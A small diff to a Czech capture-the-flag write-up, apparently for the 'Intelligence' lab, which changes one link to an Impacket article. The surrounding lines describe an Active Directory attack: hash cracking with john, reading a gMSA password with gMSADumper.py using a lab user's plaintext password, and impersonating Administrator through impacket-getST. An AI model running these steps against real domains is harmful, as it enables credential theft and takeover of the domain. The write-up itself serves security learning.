@@ -109,7 +109,7 @@ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
 Účet `Ted.Graves` sám o sobě ještě root nedává, ale `gMSADumper.py` ukáže, že skupina `itsupport` smí číst heslo gMSA účtu `svc_int$`. Jakmile je k dispozici NTLM hash gMSA, lze přes `impacket-getST` vyžádat service ticket pro `WWW/dc.intelligence.htb` a rovnou při tom impersonovat `Administrator`.
 
-Širší praktický kontext k podobným utilitám a jejich rodinám je v článku [Impacket](/nastroje/impacket).
+Širší praktický kontext k téhle rodině utilit je v článku [Impacket pro relay, tajemství a delegovaná práva](/nastroje/impacket-pro-relay-tajemstvi-a-delegovana-prava).
 ```text
 python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb' -l 'dc.intelligence.htb'
 Users or groups who can read password for svc_int$:
